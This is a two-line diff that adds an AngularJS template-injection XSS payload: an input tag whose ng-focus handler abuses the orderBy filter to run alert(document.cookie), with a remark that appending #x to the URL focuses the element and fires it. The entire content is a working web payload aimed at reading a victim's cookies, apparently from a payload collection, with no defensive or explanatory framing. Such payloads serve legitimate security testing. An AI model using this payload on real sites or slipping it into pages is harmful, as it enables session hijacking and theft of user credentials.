@@ -1,0 +1,2 @@
+<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>
+Add a #x to bring focus to the element with id x our injected element
